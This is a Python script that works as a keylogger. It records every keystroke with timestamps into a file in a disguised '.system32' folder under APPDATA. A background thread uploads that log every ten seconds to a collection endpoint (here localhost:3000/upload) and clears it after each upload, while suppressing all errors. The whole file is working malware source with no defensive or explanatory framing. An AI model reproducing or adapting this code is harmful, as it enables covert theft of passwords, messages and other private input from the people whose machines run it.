from pynput.keyboard import Listener
from datetime import datetime
import os
import threading
import time
import requests

def on_press(key):
    strick_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    final_str = strick_time + " -- " + str(key) + "\n"
    appdata = os.getenv("APPDATA")
    dir_name = ".system32"
    log_file = "keylogs.txt"
    file_location = os.path.join(appdata, dir_name, log_file)
    with open(file_location, "a") as file:
        file.write(final_str)

def check_path():
    appdata = os.getenv("APPDATA")
    dir_name = ".system32"
    full_path = os.path.join(appdata, dir_name)
    if os.path.exists(full_path):
        pass
    else:
        os.mkdir(full_path)

def send_log():
        url = "http://localhost:3000/upload"
        appdata = os.getenv("APPDATA")
        dir_name = ".system32"
        log_file = "keylogs.txt"
        while True:
                try:
                    time.sleep(10) #Needs adjustment
                    file_location = os.path.join(appdata, dir_name, log_file)
                    files = {
                        'file': open(file_location, 'rb')
                    }
                    response = requests.post(url, files=files)
                    if response.status_code == 200:
                        with open(file_location, "w") as log:
                            log.write("")
                except:
                    pass
def start_listener():
        with Listener(on_press=on_press) as listener:
                listener.join()

listener_thread = threading.Thread(target=start_listener)
sender_thread = threading.Thread(target=send_log)

listener_thread.start()
sender_thread.start()

listener_thread.join()
sender_thread.join()
